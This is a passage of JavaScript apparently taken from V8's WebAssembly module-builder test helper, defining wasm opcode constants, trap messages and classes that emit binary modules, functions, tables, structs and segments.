    var kExprStringMeasureWtf8 = 0x84;
    var kExprStringMeasureWtf16 = 0x85;
    var kExprStringEncodeUtf8 = 0x86;
    var kExprStringEncodeWtf16 = 0x87;
    var kExprStringConcat = 0x88;
    var kExprStringEq = 0x89;
    var kExprStringIsUsvSequence = 0x8a;
    var kExprStringNewLossyUtf8 = 0x8b;
    var kExprStringNewWtf8 = 0x8c;
    var kExprStringEncodeLossyUtf8 = 0x8d;
    var kExprStringEncodeWtf8 = 0x8e;
    var kExprStringNewUtf8Try = 0x8f;
    var kExprStringAsWtf8 = 0x90;
    var kExprStringViewWtf8Advance = 0x91;
    var kExprStringViewWtf8EncodeUtf8 = 0x92;
    var kExprStringViewWtf8Slice = 0x93;
    var kExprStringViewWtf8EncodeLossyUtf8 = 0x94;
    var kExprStringViewWtf8EncodeWtf8 = 0x95;
    var kExprStringAsWtf16 = 0x98;
    var kExprStringViewWtf16Length = 0x99;
    var kExprStringViewWtf16GetCodeunit = 0x9a;
    var kExprStringViewWtf16Encode = 0x9b;
    var kExprStringViewWtf16Slice = 0x9c;
    var kExprStringAsIter = 0xa0;
    var kExprStringViewIterNext = 0xa1
    var kExprStringViewIterAdvance = 0xa2;
    var kExprStringViewIterRewind = 0xa3
    var kExprStringViewIterSlice = 0xa4;
    var kExprStringCompare = 0xa8;
    var kExprStringFromCodePoint = 0xa9;
    var kExprStringHash = 0xaa;
    var kExprStringNewUtf8Array = 0xb0;
    var kExprStringNewWtf16Array = 0xb1;
    var kExprStringEncodeUtf8Array = 0xb2;
    var kExprStringEncodeWtf16Array = 0xb3;
    var kExprStringNewLossyUtf8Array = 0xb4;
    var kExprStringNewWtf8Array = 0xb5;
    var kExprStringEncodeLossyUtf8Array = 0xb6;
    var kExprStringEncodeWtf8Array = 0xb7;
    var kExprStringNewUtf8ArrayTry = 0xb8;

    var kExprI32SConvertSatF32 = 0x00;
    var kExprI32UConvertSatF32 = 0x01;
    var kExprI32SConvertSatF64 = 0x02;
    var kExprI32UConvertSatF64 = 0x03;
    var kExprI64SConvertSatF32 = 0x04;
    var kExprI64UConvertSatF32 = 0x05;
    var kExprI64SConvertSatF64 = 0x06;
    var kExprI64UConvertSatF64 = 0x07;
    var kExprMemoryInit = 0x08;
    var kExprDataDrop = 0x09;
    var kExprMemoryCopy = 0x0a;
    var kExprMemoryFill = 0x0b;
    var kExprTableInit = 0x0c;
    var kExprElemDrop = 0x0d;
    var kExprTableCopy = 0x0e;
    var kExprTableGrow = 0x0f;
    var kExprTableSize = 0x10;
    var kExprTableFill = 0x11;

    var kExprAtomicNotify = 0x00;
    var kExprI32AtomicWait = 0x01;
    var kExprI64AtomicWait = 0x02;
    var kExprAtomicFence = 0x03;
    var kExprI32AtomicLoad = 0x10;
    var kExprI32AtomicLoad8U = 0x12;
    var kExprI32AtomicLoad16U = 0x13;
    var kExprI32AtomicStore = 0x17;
    var kExprI32AtomicStore8U = 0x19;
    var kExprI32AtomicStore16U = 0x1a;
    var kExprI32AtomicAdd = 0x1e;
    var kExprI32AtomicAdd8U = 0x20;
    var kExprI32AtomicAdd16U = 0x21;
    var kExprI32AtomicSub = 0x25;
    var kExprI32AtomicSub8U = 0x27;
    var kExprI32AtomicSub16U = 0x28;
    var kExprI32AtomicAnd = 0x2c;
    var kExprI32AtomicAnd8U = 0x2e;
    var kExprI32AtomicAnd16U = 0x2f;
    var kExprI32AtomicOr = 0x33;
    var kExprI32AtomicOr8U = 0x35;
    var kExprI32AtomicOr16U = 0x36;
    var kExprI32AtomicXor = 0x3a;
    var kExprI32AtomicXor8U = 0x3c;
    var kExprI32AtomicXor16U = 0x3d;
    var kExprI32AtomicExchange = 0x41;
    var kExprI32AtomicExchange8U = 0x43;
    var kExprI32AtomicExchange16U = 0x44;
    var kExprI32AtomicCompareExchange = 0x48;
    var kExprI32AtomicCompareExchange8U = 0x4a;
    var kExprI32AtomicCompareExchange16U = 0x4b;

    var kExprI64AtomicLoad = 0x11;
    var kExprI64AtomicLoad8U = 0x14;
    var kExprI64AtomicLoad16U = 0x15;
    var kExprI64AtomicLoad32U = 0x16;
    var kExprI64AtomicStore = 0x18;
    var kExprI64AtomicStore8U = 0x1b;
    var kExprI64AtomicStore16U = 0x1c;
    var kExprI64AtomicStore32U = 0x1d;
    var kExprI64AtomicAdd = 0x1f;
    var kExprI64AtomicAdd8U = 0x22;
    var kExprI64AtomicAdd16U = 0x23;
    var kExprI64AtomicAdd32U = 0x24;
    var kExprI64AtomicSub = 0x26;
    var kExprI64AtomicSub8U = 0x29;
    var kExprI64AtomicSub16U = 0x2a;
    var kExprI64AtomicSub32U = 0x2b;
    var kExprI64AtomicAnd = 0x2d;
    var kExprI64AtomicAnd8U = 0x30;
    var kExprI64AtomicAnd16U = 0x31;
    var kExprI64AtomicAnd32U = 0x32;
    var kExprI64AtomicOr = 0x34;
    var kExprI64AtomicOr8U = 0x37;
    var kExprI64AtomicOr16U = 0x38;
    var kExprI64AtomicOr32U = 0x39;
    var kExprI64AtomicXor = 0x3b;
    var kExprI64AtomicXor8U = 0x3e;
    var kExprI64AtomicXor16U = 0x3f;
    var kExprI64AtomicXor32U = 0x40;
    var kExprI64AtomicExchange = 0x42;
    var kExprI64AtomicExchange8U = 0x45;
    var kExprI64AtomicExchange16U = 0x46;
    var kExprI64AtomicExchange32U = 0x47;
    var kExprI64AtomicCompareExchange = 0x49
    var kExprI64AtomicCompareExchange8U = 0x4c;
    var kExprI64AtomicCompareExchange16U = 0x4d;
    var kExprI64AtomicCompareExchange32U = 0x4e;

    var kExprPause = 0x04;
    var kExprStructAtomicGet = 0x5c;
    var kExprStructAtomicGetS = 0x5d;
    var kExprStructAtomicGetU = 0x5e;
    var kExprStructAtomicSet = 0x5f;
    var kExprStructAtomicAdd = 0x60;
    var kExprStructAtomicSub = 0x61;
    var kExprStructAtomicAnd = 0x62;
    var kExprStructAtomicOr = 0x63;
    var kExprStructAtomicXor = 0x64;
    var kExprStructAtomicExchange = 0x65;
    var kExprStructAtomicCompareExchange = 0x66;
    var kExprArrayAtomicGet = 0x67;
    var kExprArrayAtomicGetS = 0x68;
    var kExprArrayAtomicGetU = 0x69;
    var kExprArrayAtomicSet = 0x6a;
    var kExprArrayAtomicAdd = 0x6b;
    var kExprArrayAtomicSub = 0x6c;
    var kExprArrayAtomicAnd = 0x6d;
    var kExprArrayAtomicOr = 0x6e;
    var kExprArrayAtomicXor = 0x6f;
    var kExprArrayAtomicExchange = 0x70;
    var kExprArrayAtomicCompareExchange = 0x71;

    var kExprS128LoadMem = 0x00;
    var kExprS128Load8x8S = 0x01;
    var kExprS128Load8x8U = 0x02;
    var kExprS128Load16x4S = 0x03;
    var kExprS128Load16x4U = 0x04;
    var kExprS128Load32x2S = 0x05;
    var kExprS128Load32x2U = 0x06;
    var kExprS128Load8Splat = 0x07;
    var kExprS128Load16Splat = 0x08;
    var kExprS128Load32Splat = 0x09;
    var kExprS128Load64Splat = 0x0a;
    var kExprS128StoreMem = 0x0b;
    var kExprS128Const = 0x0c;
    var kExprI8x16Shuffle = 0x0d;
    var kExprI8x16Swizzle = 0x0e;

    var kExprI8x16Splat = 0x0f;
    var kExprI16x8Splat = 0x10;
    var kExprI32x4Splat = 0x11;
    var kExprI64x2Splat = 0x12;
    var kExprF32x4Splat = 0x13;
    var kExprF64x2Splat = 0x14;
    var kExprI8x16ExtractLaneS = 0x15;
    var kExprI8x16ExtractLaneU = 0x16;
    var kExprI8x16ReplaceLane = 0x17;
    var kExprI16x8ExtractLaneS = 0x18;
    var kExprI16x8ExtractLaneU = 0x19;
    var kExprI16x8ReplaceLane = 0x1a;
    var kExprI32x4ExtractLane = 0x1b;
    var kExprI32x4ReplaceLane = 0x1c;
    var kExprI64x2ExtractLane = 0x1d;
    var kExprI64x2ReplaceLane = 0x1e;
    var kExprF32x4ExtractLane = 0x1f;
    var kExprF32x4ReplaceLane = 0x20;
    var kExprF64x2ExtractLane = 0x21;
    var kExprF64x2ReplaceLane = 0x22;
    var kExprI8x16Eq = 0x23;
    var kExprI8x16Ne = 0x24;
    var kExprI8x16LtS = 0x25;
    var kExprI8x16LtU = 0x26;
    var kExprI8x16GtS = 0x27;
    var kExprI8x16GtU = 0x28;
    var kExprI8x16LeS = 0x29;
    var kExprI8x16LeU = 0x2a;
    var kExprI8x16GeS = 0x2b;
    var kExprI8x16GeU = 0x2c;
    var kExprI16x8Eq = 0x2d;
    var kExprI16x8Ne = 0x2e;
    var kExprI16x8LtS = 0x2f;
    var kExprI16x8LtU = 0x30;
    var kExprI16x8GtS = 0x31;
    var kExprI16x8GtU = 0x32;
    var kExprI16x8LeS = 0x33;
    var kExprI16x8LeU = 0x34;
    var kExprI16x8GeS = 0x35;
    var kExprI16x8GeU = 0x36;
    var kExprI32x4Eq = 0x37;
    var kExprI32x4Ne = 0x38;
    var kExprI32x4LtS = 0x39;
    var kExprI32x4LtU = 0x3a;
    var kExprI32x4GtS = 0x3b;
    var kExprI32x4GtU = 0x3c;
    var kExprI32x4LeS = 0x3d;
    var kExprI32x4LeU = 0x3e;
    var kExprI32x4GeS = 0x3f;
    var kExprI32x4GeU = 0x40;
    var kExprF32x4Eq = 0x41;
    var kExprF32x4Ne = 0x42;
    var kExprF32x4Lt = 0x43;
    var kExprF32x4Gt = 0x44;
    var kExprF32x4Le = 0x45;
    var kExprF32x4Ge = 0x46;
    var kExprF64x2Eq = 0x47;
    var kExprF64x2Ne = 0x48;
    var kExprF64x2Lt = 0x49;
    var kExprF64x2Gt = 0x4a;
    var kExprF64x2Le = 0x4b;
    var kExprF64x2Ge = 0x4c;
    var kExprS128Not = 0x4d;
    var kExprS128And = 0x4e;
    var kExprS128AndNot = 0x4f;
    var kExprS128Or = 0x50;
    var kExprS128Xor = 0x51;
    var kExprS128Select = 0x52;
    var kExprV128AnyTrue = 0x53;
    var kExprS128Load8Lane = 0x54;
    var kExprS128Load16Lane = 0x55;
    var kExprS128Load32Lane = 0x56;
    var kExprS128Load64Lane = 0x57;
    var kExprS128Store8Lane = 0x58;
    var kExprS128Store16Lane = 0x59;
    var kExprS128Store32Lane = 0x5a;
    var kExprS128Store64Lane = 0x5b;
    var kExprS128Load32Zero = 0x5c;
    var kExprS128Load64Zero = 0x5d;
    var kExprF32x4DemoteF64x2Zero = 0x5e;
    var kExprF64x2PromoteLowF32x4 = 0x5f;
    var kExprI8x16Abs = 0x60;
    var kExprI8x16Neg = 0x61;
    var kExprI8x16Popcnt = 0x62;
    var kExprI8x16AllTrue = 0x63;
    var kExprI8x16BitMask = 0x64;
    var kExprI8x16SConvertI16x8 = 0x65;
    var kExprI8x16UConvertI16x8 = 0x66;
    var kExprF32x4Ceil = 0x67;
    var kExprF32x4Floor = 0x68;
    var kExprF32x4Trunc = 0x69;
    var kExprF32x4NearestInt = 0x6a;
    var kExprI8x16Shl = 0x6b;
    var kExprI8x16ShrS = 0x6c;
    var kExprI8x16ShrU = 0x6d;
    var kExprI8x16Add = 0x6e;
    var kExprI8x16AddSatS = 0x6f;
    var kExprI8x16AddSatU = 0x70;
    var kExprI8x16Sub = 0x71;
    var kExprI8x16SubSatS = 0x72;
    var kExprI8x16SubSatU = 0x73;
    var kExprF64x2Ceil = 0x74;
    var kExprF64x2Floor = 0x75;
    var kExprI8x16MinS = 0x76;
    var kExprI8x16MinU = 0x77;
    var kExprI8x16MaxS = 0x78;
    var kExprI8x16MaxU = 0x79;
    var kExprF64x2Trunc = 0x7a;
    var kExprI8x16RoundingAverageU = 0x7b;
    var kExprI16x8ExtAddPairwiseI8x16S = 0x7c;
    var kExprI16x8ExtAddPairwiseI8x16U = 0x7d;
    var kExprI32x4ExtAddPairwiseI16x8S = 0x7e;
    var kExprI32x4ExtAddPairwiseI16x8U = 0x7f;
    var kExprI16x8Abs = 0x80;
    var kExprI16x8Neg = 0x81;
    var kExprI16x8Q15MulRSatS = 0x82;
    var kExprI16x8AllTrue = 0x83;
    var kExprI16x8BitMask = 0x84;
    var kExprI16x8SConvertI32x4 = 0x85;
    var kExprI16x8UConvertI32x4 = 0x86;
    var kExprI16x8SConvertI8x16Low = 0x87;
    var kExprI16x8SConvertI8x16High = 0x88;
    var kExprI16x8UConvertI8x16Low = 0x89;
    var kExprI16x8UConvertI8x16High = 0x8a;
    var kExprI16x8Shl = 0x8b;
    var kExprI16x8ShrS = 0x8c;
    var kExprI16x8ShrU = 0x8d;
    var kExprI16x8Add = 0x8e;
    var kExprI16x8AddSatS = 0x8f;
    var kExprI16x8AddSatU = 0x90;
    var kExprI16x8Sub = 0x91;
    var kExprI16x8SubSatS = 0x92;
    var kExprI16x8SubSatU = 0x93;
    var kExprF64x2NearestInt = 0x94;
    var kExprI16x8Mul = 0x95;
    var kExprI16x8MinS = 0x96;
    var kExprI16x8MinU = 0x97;
    var kExprI16x8MaxS = 0x98;
    var kExprI16x8MaxU = 0x99;
    var kExprI16x8RoundingAverageU = 0x9b;
    var kExprI16x8ExtMulLowI8x16S = 0x9c;
    var kExprI16x8ExtMulHighI8x16S = 0x9d;
    var kExprI16x8ExtMulLowI8x16U = 0x9e;
    var kExprI16x8ExtMulHighI8x16U = 0x9f;
    var kExprI32x4Abs = 0xa0;
    var kExprI32x4Neg = 0xa1;
    var kExprI32x4AllTrue = 0xa3;
    var kExprI32x4BitMask = 0xa4;
    var kExprI32x4SConvertI16x8Low = 0xa7;
    var kExprI32x4SConvertI16x8High = 0xa8;
    var kExprI32x4UConvertI16x8Low = 0xa9;
    var kExprI32x4UConvertI16x8High = 0xaa;
    var kExprI32x4Shl = 0xab;
    var kExprI32x4ShrS = 0xac;
    var kExprI32x4ShrU = 0xad;
    var kExprI32x4Add = 0xae;
    var kExprI32x4Sub = 0xb1;
    var kExprI32x4Mul = 0xb5;
    var kExprI32x4MinS = 0xb6;
    var kExprI32x4MinU = 0xb7;
    var kExprI32x4MaxS = 0xb8;
    var kExprI32x4MaxU = 0xb9;
    var kExprI32x4DotI16x8S = 0xba;
    var kExprI32x4ExtMulLowI16x8S = 0xbc;
    var kExprI32x4ExtMulHighI16x8S = 0xbd;
    var kExprI32x4ExtMulLowI16x8U = 0xbe;
    var kExprI32x4ExtMulHighI16x8U = 0xbf;
    var kExprI64x2Abs = 0xc0;
    var kExprI64x2Neg = 0xc1;
    var kExprI64x2AllTrue = 0xc3;
    var kExprI64x2BitMask = 0xc4;
    var kExprI64x2SConvertI32x4Low = 0xc7;
    var kExprI64x2SConvertI32x4High = 0xc8;
    var kExprI64x2UConvertI32x4Low = 0xc9;
    var kExprI64x2UConvertI32x4High = 0xca;
    var kExprI64x2Shl = 0xcb;
    var kExprI64x2ShrS = 0xcc;
    var kExprI64x2ShrU = 0xcd;
    var kExprI64x2Add = 0xce;
    var kExprI64x2Sub = 0xd1;
    var kExprI64x2Mul = 0xd5;
    var kExprI64x2Eq = 0xd6;
    var kExprI64x2Ne = 0xd7;
    var kExprI64x2LtS = 0xd8;
    var kExprI64x2GtS = 0xd9;
    var kExprI64x2LeS = 0xda;
    var kExprI64x2GeS = 0xdb;
    var kExprI64x2ExtMulLowI32x4S = 0xdc;
    var kExprI64x2ExtMulHighI32x4S = 0xdd;
    var kExprI64x2ExtMulLowI32x4U = 0xde;
    var kExprI64x2ExtMulHighI32x4U = 0xdf;
    var kExprF32x4Abs = 0xe0;
    var kExprF32x4Neg = 0xe1;
    var kExprF32x4Sqrt = 0xe3;
    var kExprF32x4Add = 0xe4;
    var kExprF32x4Sub = 0xe5;
    var kExprF32x4Mul = 0xe6;
    var kExprF32x4Div = 0xe7;
    var kExprF32x4Min = 0xe8;
    var kExprF32x4Max = 0xe9;
    var kExprF32x4Pmin = 0xea;
    var kExprF32x4Pmax = 0xeb;
    var kExprF64x2Abs = 0xec;
    var kExprF64x2Neg = 0xed;
    var kExprF64x2Sqrt = 0xef;
    var kExprF64x2Add = 0xf0;
    var kExprF64x2Sub = 0xf1;
    var kExprF64x2Mul = 0xf2;
    var kExprF64x2Div = 0xf3;
    var kExprF64x2Min = 0xf4;
    var kExprF64x2Max = 0xf5;
    var kExprF64x2Pmin = 0xf6;
    var kExprF64x2Pmax = 0xf7;
    var kExprI32x4SConvertF32x4 = 0xf8;
    var kExprI32x4UConvertF32x4 = 0xf9;
    var kExprF32x4SConvertI32x4 = 0xfa;
    var kExprF32x4UConvertI32x4 = 0xfb;
    var kExprI32x4TruncSatF64x2SZero = 0xfc;
    var kExprI32x4TruncSatF64x2UZero = 0xfd;
    var kExprF64x2ConvertLowI32x4S = 0xfe;
    var kExprF64x2ConvertLowI32x4U = 0xff;

    var kExprI8x16RelaxedSwizzle = wasmSignedLeb(0x100);
    var kExprI32x4RelaxedTruncF32x4S = wasmSignedLeb(0x101);
    var kExprI32x4RelaxedTruncF32x4U = wasmSignedLeb(0x102);
    var kExprI32x4RelaxedTruncF64x2SZero = wasmSignedLeb(0x103);
    var kExprI32x4RelaxedTruncF64x2UZero = wasmSignedLeb(0x104);
    var kExprF32x4Qfma = wasmSignedLeb(0x105);
    var kExprF32x4Qfms = wasmSignedLeb(0x106);
    var kExprF64x2Qfma = wasmSignedLeb(0x107);
    var kExprF64x2Qfms = wasmSignedLeb(0x108);
    var kExprI8x16RelaxedLaneSelect = wasmSignedLeb(0x109);
    var kExprI16x8RelaxedLaneSelect = wasmSignedLeb(0x10a);
    var kExprI32x4RelaxedLaneSelect = wasmSignedLeb(0x10b);
    var kExprI64x2RelaxedLaneSelect = wasmSignedLeb(0x10c);
    var kExprF32x4RelaxedMin = wasmSignedLeb(0x10d);
    var kExprF32x4RelaxedMax = wasmSignedLeb(0x10e);
    var kExprF64x2RelaxedMin = wasmSignedLeb(0x10f);
    var kExprF64x2RelaxedMax = wasmSignedLeb(0x110);
    var kExprI16x8RelaxedQ15MulRS = wasmSignedLeb(0x111);
    var kExprI16x8DotI8x16I7x16S = wasmSignedLeb(0x112);
    var kExprI32x4DotI8x16I7x16AddS = wasmSignedLeb(0x113);

    var kExprF16x8Splat = wasmSignedLeb(0x120);
    var kExprF16x8ExtractLane = wasmSignedLeb(0x121);
    var kExprF16x8ReplaceLane = wasmSignedLeb(0x122);
    var kExprF16x8Abs = wasmSignedLeb(0x130);
    var kExprF16x8Neg = wasmSignedLeb(0x131);
    var kExprF16x8Sqrt = wasmSignedLeb(0x132);
    var kExprF16x8Ceil = wasmSignedLeb(0x133);
    var kExprF16x8Floor = wasmSignedLeb(0x134);
    var kExprF16x8Trunc = wasmSignedLeb(0x135);
    var kExprF16x8NearestInt = wasmSignedLeb(0x136);
    var kExprF16x8Eq = wasmSignedLeb(0x137);
    var kExprF16x8Ne = wasmSignedLeb(0x138);
    var kExprF16x8Lt = wasmSignedLeb(0x139);
    var kExprF16x8Gt = wasmSignedLeb(0x13a);
    var kExprF16x8Le = wasmSignedLeb(0x13b);
    var kExprF16x8Ge = wasmSignedLeb(0x13c);
    var kExprF16x8Add = wasmSignedLeb(0x13d);
    var kExprF16x8Sub = wasmSignedLeb(0x13e);
    var kExprF16x8Mul = wasmSignedLeb(0x13f);
    var kExprF16x8Div = wasmSignedLeb(0x140);
    var kExprF16x8Min = wasmSignedLeb(0x141);
    var kExprF16x8Max = wasmSignedLeb(0x142);
    var kExprF16x8Pmin = wasmSignedLeb(0x143);
    var kExprF16x8Pmax = wasmSignedLeb(0x144);
    var kExprI16x8SConvertF16x8 = wasmSignedLeb(0x145);
    var kExprI16x8UConvertF16x8 = wasmSignedLeb(0x146);
    var kExprF16x8SConvertI16x8 = wasmSignedLeb(0x147);
    var kExprF16x8UConvertI16x8 = wasmSignedLeb(0x148);
    var kExprF16x8DemoteF32x4Zero = wasmSignedLeb(0x149);
    var kExprF16x8DemoteF64x2Zero = wasmSignedLeb(0x14a);
    var kExprF32x4PromoteLowF16x8 = wasmSignedLeb(0x14b);
    var kExprF16x8Qfma = wasmSignedLeb(0x14e);
    var kExprF16x8Qfms = wasmSignedLeb(0x14f);

    var kTrapUnreachable = 0;
    var kTrapMemOutOfBounds = 1;
    var kTrapDivByZero = 2;
    var kTrapDivUnrepresentable = 3;
    var kTrapRemByZero = 4;
    var kTrapFloatUnrepresentable = 5;
    var kTrapTableOutOfBounds = 6;
    var kTrapNullFunc = 7;
    var kTrapFuncSigMismatch = 8;
    var kTrapUnalignedAccess = 9;
    var kTrapDataSegmentOutOfBounds = 10;
    var kTrapElementSegmentOutOfBounds = 11;
    var kTrapRethrowNull = 12;
    var kTrapArrayTooLarge = 13;
    var kTrapArrayOutOfBounds = 14;
    var kTrapNullDereference = 15;
    var kTrapIllegalCast = 16;

    var kAtomicWaitOk = 0;
    var kAtomicWaitNotEqual = 1;
    var kAtomicWaitTimedOut = 2;

    var kCatchNoRef = 0x0;
    var kCatchRef = 0x1;
    var kCatchAllNoRef = 0x2;
    var kCatchAllRef = 0x3;

    var kOnSuspend = 0x0;
    var kOnSwitch = 0x1;

    var kTrapMsgs = [
      'unreachable',
      'memory access out of bounds',
      'divide by zero',
      'divide result unrepresentable',
      'remainder by zero',
      'float unrepresentable in integer range',
      'table index is out of bounds',
      'null function',
      'function signature mismatch',
      'operation does not support unaligned accesses',
      'data segment out of bounds',
      'element segment out of bounds',
      'rethrowing null value',
      'requested new array is too large',
      'array element access out of bounds',
      'dereferencing a null pointer',
      'illegal cast',
    ];

    function assertTraps(trap, code) {
      assertThrows(code, WebAssembly.RuntimeError, new RegExp(kTrapMsgs[trap]));
    }

    function assertTrapsOneOf(traps, code) {
      const errorChecker = new RegExp(
        '(' + traps.map(trap => kTrapMsgs[trap]).join('|') + ')'
      );
      assertThrows(code, WebAssembly.RuntimeError, errorChecker);
    }

    globalThis.Binary = class {
      constructor() {
        this.length = 0;
        this.buffer = new Uint8Array(8192);
      }

      ensure_space(needed) {
        if (this.buffer.length - this.length >= needed) return;
        let new_capacity = this.buffer.length * 2;
        while (new_capacity - this.length < needed) new_capacity *= 2;
        let new_buffer = new Uint8Array(new_capacity);
        new_buffer.set(this.buffer);
        this.buffer = new_buffer;
      }

      trunc_buffer() {
        return new Uint8Array(this.buffer.buffer, 0, this.length);
      }

      reset() {
        this.length = 0;
      }

      emit_u8(val) {
        this.ensure_space(1);
        this.buffer[this.length++] = val;
      }

      emit_u16(val) {
        this.ensure_space(2);
        this.buffer[this.length++] = val;
        this.buffer[this.length++] = val >> 8;
      }

      emit_u32(val) {
        this.ensure_space(4);
        this.buffer[this.length++] = val;
        this.buffer[this.length++] = val >> 8;
        this.buffer[this.length++] = val >> 16;
        this.buffer[this.length++] = val >> 24;
      }

      emit_leb_u(val, max_len) {
        this.ensure_space(max_len);
        for (let i = 0; i < max_len; ++i) {
          let v = val & 0xff;
          val = val >>> 7;
          if (val == 0) {
            this.buffer[this.length++] = v;
            return;
          }
          this.buffer[this.length++] = v | 0x80;
        }
        throw new Error('Leb value exceeds maximum length of ' + max_len);
      }

      emit_u32v(val) {
        this.emit_leb_u(val, kMaxVarInt32Size);
      }

      emit_u64v(val) {
        this.emit_leb_u(val, kMaxVarInt64Size);
      }

      emit_bytes(data) {
        this.ensure_space(data.length);
        this.buffer.set(data, this.length);
        this.length += data.length;
      }

      emit_string(string) {
        if (string instanceof Array) {
          this.emit_u32v(string.length);
          this.emit_bytes(string);
          return;
        }

        let string_utf8 = unescape(encodeURIComponent(string));
        this.emit_u32v(string_utf8.length);
        for (let i = 0; i < string_utf8.length; i++) {
          this.emit_u8(string_utf8.charCodeAt(i));
        }
      }

      emit_heap_type(heap_type) {
        this.emit_bytes(wasmSignedLeb(heap_type, kMaxVarInt32Size));
      }

      emit_type(type) {
        if ((typeof type) == 'number') {
          this.emit_u8(type >= 0 ? type : type & kLeb128Mask);
        } else {
          this.emit_u8(type.opcode);
          if (type.is_shared) this.emit_u8(kWasmSharedTypeForm);
          if (type.is_exact) this.emit_u8(kWasmExact);
          this.emit_heap_type(type.heap_type);
        }
      }

      emit_init_expr(expr) {
        this.emit_bytes(expr);
        this.emit_u8(kExprEnd);
      }

      emit_header() {
        this.emit_bytes([
          kWasmH0, kWasmH1, kWasmH2, kWasmH3, kWasmV0, kWasmV1, kWasmV2, kWasmV3
        ]);
      }

      emit_section(section_code, content_generator) {
        this.emit_u8(section_code);
        const section = new Binary;
        content_generator(section);
        this.emit_u32v(section.length);
        this.emit_bytes(section.trunc_buffer());
      }
    }

    globalThis.WasmFunctionBuilder = class {
      constructor(module, name, type_index, arg_names) {
        this.module = module;
        this.name = name;
        this.type_index = type_index;
        this.body = [];
        this.locals = [];
        this.local_names = arg_names;
        this.body_offset = undefined;
      }

      numLocalNames() {
        let num_local_names = 0;
        for (let loc_name of this.local_names) {
          if (typeof loc_name == 'string') ++num_local_names;
        }
        return num_local_names;
      }

      exportAs(name) {
        this.module.addExport(name, this.index);
        return this;
      }

      exportFunc() {
        this.exportAs(this.name);
        return this;
      }

      addBody(body) {
        checkExpr(body);
        this.body = body.concat([kExprEnd]);
        return this;
      }

      addBodyWithEnd(body) {
        this.body = body;
        return this;
      }

      getNumLocals() {
        let total_locals = 0;
        for (let l of this.locals) {
          total_locals += l.count
        }
        return total_locals;
      }

      addLocals(type, count, names) {
        this.locals.push({type: type, count: count});
        names = names || [];
        if (names.length > count) throw new Error('too many locals names given');
        this.local_names.push(...names);
        if (count > names.length) this.local_names.push(count - names.length);
        return this;
      }

      end() {
        return this.module;
      }
    }

    globalThis.WasmGlobalBuilder = class {
      constructor(module, type, mutable, shared, init) {
        this.module = module;
        this.type = type;
        this.mutable = mutable;
        this.shared = shared;
        this.init = init;
      }

      exportAs(name) {
        this.module.exports.push(
            {name: name, kind: kExternalGlobal, index: this.index});
        return this;
      }
    }

    function checkExpr(expr) {
      for (let b of expr) {
        if (typeof b !== 'number' || (b & (~0xFF)) !== 0) {
          throw new Error(
              'invalid body (entries must be 8 bit numbers): ' + expr);
        }
      }
    }

    globalThis.WasmTableBuilder = class {
      constructor(module, type, initial_size, max_size, init_expr, is_shared, is_table64) {
        this.module = module;
        this.type = type;
        this.initial_size = initial_size;
        this.has_max = max_size !== undefined;
        this.max_size = max_size;
        this.init_expr = init_expr;
        this.has_init = init_expr !== undefined;
        this.is_shared = is_shared;
        this.is_table64 = is_table64;
      }

      exportAs(name) {
        this.module.exports.push(
            {name: name, kind: kExternalTable, index: this.index});
        return this;
      }
    }

    function makeField(type, mutability) {
      if ((typeof mutability) != 'boolean') {
        throw new Error('field mutability must be boolean');
      }
      return {type: type, mutability: mutability};
    }

    function MustBeNumber(x, name) {
      if (typeof x !== 'undefined' && typeof x !== 'number') {
        throw new Error(`${name} must be a number, was ${x}`);
      }
      return x;
    }

    globalThis.WasmStruct = class {
      constructor(fields, is_final, is_shared, supertype_idx) {
        let descriptor = undefined;
        let describes = undefined;
        if (Array.isArray(fields)) {
        } else if (fields.constructor === Object) {
          is_final = fields.is_final ?? fields.final ?? false;
          is_shared = fields.is_shared ?? fields.shared ?? false;
          supertype_idx = MustBeNumber(
              fields.supertype_idx ?? fields.supertype ?? kNoSuperType,
              "supertype");
          descriptor = MustBeNumber(fields.descriptor, "'descriptor'");
          describes = MustBeNumber(fields.describes, "'describes'");
          fields = fields.fields ?? [];
        } else {
          throw new Error('struct fields must be an array');
        }
        this.fields = fields;
        this.type_form = kWasmStructTypeForm;
        this.is_final = is_final;
        this.is_shared = is_shared;
        this.supertype = supertype_idx;
        this.descriptor = descriptor;
        this.describes = describes;
      }
    }

    globalThis.WasmArray = class {
      constructor(type, mutability, is_final, is_shared, supertype_idx) {
        this.type = type;
        this.mutability = mutability;
        this.type_form = kWasmArrayTypeForm;
        this.is_final = is_final;
        this.is_shared = is_shared;
        this.supertype = supertype_idx;
      }
    }

    globalThis.WasmCont = class {
      constructor(type_index) {
        this.type_index = type_index;
        this.supertype = kNoSuperType;
        this.is_final = true;
        this.is_shared = false;
      }
    }

    globalThis.WasmElemSegment = class {
      constructor(table, offset, type, elements, is_decl, is_shared) {
        this.table = table;
        this.offset = offset;
        this.type = type;
        this.elements = elements;
        this.is_decl = is_decl;
        this.is_shared = is_shared;
        if ((table === undefined) != (offset === undefined)) {
          throw new Error("invalid element segment");
        }
        for (let elem of elements) {
          if (((typeof elem) == 'number') != (type === undefined)) {
            throw new Error("invalid element");
          }
        }
      }

      is_active() {
        return this.table !== undefined;
      }

      is_passive() {
        return this.table === undefined && !this.is_decl;
      }

      is_declarative() {
        return this.table === undefined && this.is_decl;
      }

      expressions_as_elements() {
        return this.type !== undefined;
      }
    }

    globalThis.WasmModuleBuilder = class {
      constructor() {
        this.types = [];
        this.imports = [];
        this.exports = [];
        this.stringrefs = [];
        this.globals = [];
        this.tables = [];
        this.tags = [];
        this.memories = [];
        this.functions = [];
        this.element_segments = [];
        this.data_segments = [];
        this.explicit = [];
        this.rec_groups = [];
        this.compilation_priorities = new Map();
        this.instruction_frequencies = new Map();
        this.call_targets = new Map();
        this.start_index = undefined;
        this.num_imported_funcs = 0;
        this.num_imported_globals = 0;
        this.num_imported_tables = 0;
        this.num_imported_tags = 0;
        return this;
      }

      addStart(start_index) {
        this.start_index = start_index;
        return this;
      }

      addMemory(min, max, shared) {
        const imported_memories =
            this.imports.filter(i => i.kind == kExternalMemory).length;
        const mem_index = imported_memories + this.memories.length;
        this.memories.push(
            {min: min, max: max, shared: shared || false, is_memory64: false});
        return mem_index;
      }

      addMemory64(min, max, shared) {
        const imported_memories =
            this.imports.filter(i => i.kind == kExternalMemory).length;
        const mem_index = imported_memories + this.memories.length;
        this.memories.push(
            {min: min, max: max, shared: shared || false, is_memory64: true});
        return mem_index;
      }

      addExplicitSection(bytes) {
        this.explicit.push(bytes);
        return this;
      }

      stringToBytes(name) {
        var result = new Binary();
        result.emit_u32v(name.length);
        for (var i = 0; i < name.length; i++) {
